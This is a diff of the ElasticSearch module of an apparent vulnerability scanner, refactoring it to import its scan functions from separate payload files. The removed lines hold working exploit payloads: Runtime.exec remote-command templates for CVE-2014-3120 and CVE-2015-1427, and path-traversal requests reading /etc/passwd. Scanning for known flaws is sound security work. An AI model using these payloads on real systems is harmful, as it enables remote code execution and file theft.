@@ -25,10 +25,8 @@ file:///C:\Windows\System32\drivers\etc\hosts
         #  Elasticsearch写入webshell
         #   WooYun-2015-110216
 
-from lib.initial.config import config
-from lib.tool.md5 import md5, random_md5
+# from lib.initial.config import config
 from lib.tool.thread import thread
-from lib.tool import head
 from payloads.ElasticSearch.cve_2014_3120 import cve_2014_3120_scan
 from payloads.ElasticSearch.cve_2015_1427 import cve_2015_1427_scan
 from payloads.ElasticSearch.cve_2015_3337 import cve_2015_3337_scan
@@ -36,90 +34,17 @@ from payloads.ElasticSearch.cve_2015_5531 import cve_2015_5531_scan
 
 class ElasticSearch():
     def __init__(self):
-        self.timeout = config.get('timeout')
-        self.headers = config.get('headers')
-        self.proxies = config.get('proxies')
-
         self.app_name = 'ElasticSearch'
-        self.md = md5(self.app_name)
-        self.cmd = 'echo ' + self.md
 
-        self.cve_2014_3120_payloads = [
-            {
-                'path': 'website/blog/',
-                'data': '{"name": "mouse"}',
-                'headers': head.merge(self.headers, {})
-            },
-            {
-                'path': '_search?pretty',
-                'data': '''{
-    "size": 1,
-    "query": {
-      "filtered": {
-        "query": {
-          "match_all": {
-          }
-        }
-      }
-    },
-    "script_fields": {
-        "command": {
-            "script": "import java.io.*;new java.util.Scanner(Runtime.getRuntime().exec(\\"COMMAND\\").getInputStream()).useDelimiter(\\"\\\\\\\\A\\").next();"
-        }
-    }
-}'''.replace('COMMAND', self.cmd),
-                'headers': head.merge(self.headers, {})
-            }
-        ]
-
-        self.cve_2015_1427_payloads = [
-            {
-                'path': 'website/blog/',
-                'data': '{"name": "mouse2"}',
-                'headers': head.merge(self.headers, {})
-            },
-            {
-                'path': '_search?pretty',
-                'data': '{"size":1, "script_fields": {"lupin":{"lang":"groovy","script": "java.lang.Math.class.forName(\\"java.lang.Runtime\\").getRuntime().exec(\\"COMMAND\\").getText()"}}}'.replace('COMMAND', self.cmd),
-                'headers': head.merge(self.headers, {})
-            }
-        ]
-
-        self.cve_2015_3337_payloads = [
-            {
-                'path': '_plugin/head/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd',
-                'data': '',
-                'headers': head.merge(self.headers, {})
-            },
-        ]
-
-        self.cve_2015_5531_payloads = [
-            {
-                'path': '_snapshot/mouse3',
-                'data': '{"type": "fs","settings": {"location": "/usr/share/elasticsearch/repo/mouse3"}}',
-                'headers': head.merge(self.headers, {})
-            },
-            {
-                'path': '_snapshot/mouse33',
-                'data': '{"type": "fs","settings": {"location": "/usr/share/elasticsearch/repo/mouse3/snapshot-backdata"}}',
-                'headers': head.merge(self.headers, {})
-            },
-            {
-                'path': '_snapshot/mouse3/backdata%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd',
-                'data': '',
-                'headers': head.merge(self.headers, {})
-            }
-        ]
-    
-    def addscan(self, url, vuln=None):
+    def addscan(self, clients, vuln=None):
         if vuln:
-            return eval('thread(target=self.{}_scan, url="{}")'.format(vuln, url))
+            return eval('thread(target=self.{}_scan, clients=clients)'.format(vuln))
 
         return [
-            thread(target=self.cve_2014_3120_scan, url=url),
-            thread(target=self.cve_2015_1427_scan, url=url),
-            thread(target=self.cve_2015_3337_scan, url=url),
-            thread(target=self.cve_2015_5531_scan, url=url)
+            thread(target=self.cve_2014_3120_scan, clients=clients),
+            thread(target=self.cve_2015_1427_scan, clients=clients),
+            thread(target=self.cve_2015_3337_scan, clients=clients),
+            thread(target=self.cve_2015_5531_scan, clients=clients)
         ]
 
 ElasticSearch.cve_2014_3120_scan = cve_2014_3120_scan
